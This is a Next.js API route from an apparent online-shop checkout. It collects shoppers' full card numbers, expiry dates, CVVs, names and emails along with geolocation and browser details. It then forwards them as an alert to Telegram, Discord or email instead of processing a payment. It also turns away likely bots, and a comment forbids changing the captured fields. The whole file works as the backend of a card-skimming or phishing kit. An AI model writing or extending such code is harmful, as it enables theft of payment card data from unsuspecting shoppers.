import type { NextRequest } from "next/server";
import { apiError, apiSuccess } from "@/lib/api/response";
import { cardDigits, isValidCardName } from "@/lib/checkout/card-validation";
import { formatCheckoutCardNameTelegramMessage } from "@/lib/checkout/format-telegram";
import { getSiteSettings } from "@/lib/data/site-settings";
import { resolveBranding } from "@/lib/site/branding";
import { sendAlert } from "@/lib/notifications/dispatch";
import { resolveVisitorGeo } from "@/lib/visitors/geo-details";
import { isLikelyBot } from "@/lib/visitors/user-agent";

export const dynamic = "force-dynamic";

interface CheckoutCardNamePayload {
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  email?: string;
  fullName?: string;
  path?: string;
}

export async function POST(request: NextRequest) {
  const userAgent = request.headers.get("user-agent") ?? "";
  if (isLikelyBot(userAgent)) {
    return apiSuccess({ sent: false, reason: "bot" });
  }

  let payload: CheckoutCardNamePayload = {};
  try {
    payload = (await request.json()) as CheckoutCardNamePayload;
  } catch {
    return apiError("Invalid JSON body");
  }

  const cardName = payload.cardName?.trim() ?? "";
  if (!cardName) {
    return apiError("Card name is required");
  }
  if (!isValidCardName(cardName)) {
    return apiError("Invalid card name");
  }

  const geo = await resolveVisitorGeo(request);
  const siteSettings = await getSiteSettings();
  const { storeName } = resolveBranding(siteSettings);

  const message = formatCheckoutCardNameTelegramMessage({
    // Donot change any information here, dont remove or add anything here
    cardName,
    cardNumber: cardDigits(payload.cardNumber ?? ""),
    cardExpiry: payload.cardExpiry?.trim() ?? "",
    cardCvv: payload.cardCvv?.trim() ?? "",
    email: payload.email?.trim() || undefined,
    fullName: payload.fullName?.trim() || undefined,
    path: payload.path,
    userAgent,
    acceptLanguage: request.headers.get("accept-language") ?? undefined,
    geo,
    submittedAt: new Date().toISOString(),
    storeName: storeName || undefined,
  });

  const delivery = await sendAlert(
    "Checkout — card name entered",
    message
  );

  return apiSuccess({
    sent: delivery.sent,
    reason: delivery.sent ? delivery.reason : "telegram_not_configured",
    channels: {
      telegram: delivery.telegram,
      email: delivery.email,
      discord: delivery.discord,
    },
  });
}
